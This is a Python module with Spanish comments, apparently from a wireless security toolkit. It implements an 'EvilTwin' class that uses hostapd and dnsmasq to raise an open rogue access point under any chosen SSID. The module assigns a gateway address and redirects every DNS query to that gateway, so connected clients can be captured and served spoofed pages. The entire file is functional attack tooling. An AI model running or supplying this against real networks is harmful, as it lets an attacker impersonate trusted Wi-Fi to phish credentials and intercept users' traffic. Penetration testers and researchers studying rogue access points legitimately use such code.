from core.event_bus import EventBus
from core.logger import get_logger
import subprocess
import os
import time

log = get_logger("wifi.evil_twin")
bus = EventBus()

HOSTAPD_CONF  = '/tmp/evil_twin_hostapd.conf'
DNSMASQ_CONF  = '/tmp/evil_twin_dnsmasq.conf'

class EvilTwin:
    def __init__(self, interface='wlan0'):
        # Usa wlan0 (WiFi integrado) para el AP falso
        # wlan1 queda libre para el IDS
        self.interface = interface
        self._hostapd_proc  = None
        self._dnsmasq_proc  = None
        self.running = False

    def start(self, ssid: str, channel: int = 6) -> bool:
        """Levanta un AP falso con el SSID dado"""
        log.warning(f"Iniciando Evil Twin | SSID: {ssid} | CH: {channel}")

        if not self._write_hostapd_conf(ssid, channel):
            return False
        if not self._write_dnsmasq_conf():
            return False
        if not self._configure_interface():
            return False
        if not self._start_hostapd():
            return False
        if not self._start_dnsmasq():
            self.stop()
            return False

        self.running = True
        bus.publish_sync('wifi.evil_twin_started', {
            'ssid':      ssid,
            'channel':   channel,
            'interface': self.interface,
            'gateway':   '192.168.10.1',
        })
        log.info(f"Evil Twin activo — SSID: {ssid} en 192.168.10.1")
        return True

    def stop(self):
        """Detiene el Evil Twin y limpia la configuracion"""
        log.info("Deteniendo Evil Twin...")

        if self._hostapd_proc:
            self._hostapd_proc.terminate()
            self._hostapd_proc = None

        if self._dnsmasq_proc:
            self._dnsmasq_proc.terminate()
            self._dnsmasq_proc = None

        # Limpiar IP de la interfaz
        subprocess.run(
            ['sudo', 'ip', 'addr', 'flush', 'dev', self.interface],
            capture_output=True
        )
        subprocess.run(['sudo', 'systemctl', 'start', 'hostapd'], capture_output=True)

        self.running = False
        bus.publish_sync('wifi.evil_twin_stopped', {'interface': self.interface})
        log.info("Evil Twin detenido.")

    def _write_hostapd_conf(self, ssid: str, channel: int) -> bool:
        try:
            conf = f"""interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
            with open(HOSTAPD_CONF, 'w') as f:
                f.write(conf)
            return True
        except Exception as e:
            log.error(f"Error escribiendo hostapd.conf: {e}")
            return False

    def _write_dnsmasq_conf(self) -> bool:
        try:
            conf = f"""interface={self.interface}
dhcp-range=192.168.10.10,192.168.10.100,255.255.255.0,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
address=/#/192.168.10.1
"""
            with open(DNSMASQ_CONF, 'w') as f:
                f.write(conf)
            return True
        except Exception as e:
            log.error(f"Error escribiendo dnsmasq.conf: {e}")
            return False

    def _configure_interface(self) -> bool:
        try:
            # Detener hostapd del sistema si esta corriendo
            subprocess.run(['sudo', 'systemctl', 'stop', 'hostapd'], capture_output=True)
            # Asignar IP al AP falso
            subprocess.run(
                ['sudo', 'ip', 'addr', 'add', '192.168.10.1/24', 'dev', self.interface],
                capture_output=True
            )
            subprocess.run(
                ['sudo', 'ip', 'link', 'set', self.interface, 'up'],
                capture_output=True
            )
            return True
        except Exception as e:
            log.error(f"Error configurando interfaz: {e}")
            return False

    def _start_hostapd(self) -> bool:
        try:
            self._hostapd_proc = subprocess.Popen(
                ['sudo', 'hostapd', HOSTAPD_CONF],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(2)
            if self._hostapd_proc.poll() is not None:
                log.error("hostapd falló al iniciar")
                return False
            log.info("hostapd corriendo.")
            return True
        except FileNotFoundError:
            log.error("hostapd no instalado — sudo apt install hostapd")
            return False
        except Exception as e:
            log.error(f"hostapd error: {e}")
            return False

    def _start_dnsmasq(self) -> bool:
        try:
            self._dnsmasq_proc = subprocess.Popen(
                ['sudo', 'dnsmasq', '-C', DNSMASQ_CONF, '--no-daemon'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(1)
            if self._dnsmasq_proc.poll() is not None:
                log.error("dnsmasq falló al iniciar")
                return False
            log.info("dnsmasq corriendo.")
            return True
        except FileNotFoundError:
            log.error("dnsmasq no instalado — sudo apt install dnsmasq")
            return False
        except Exception as e:
            log.error(f"dnsmasq error: {e}")
            return False
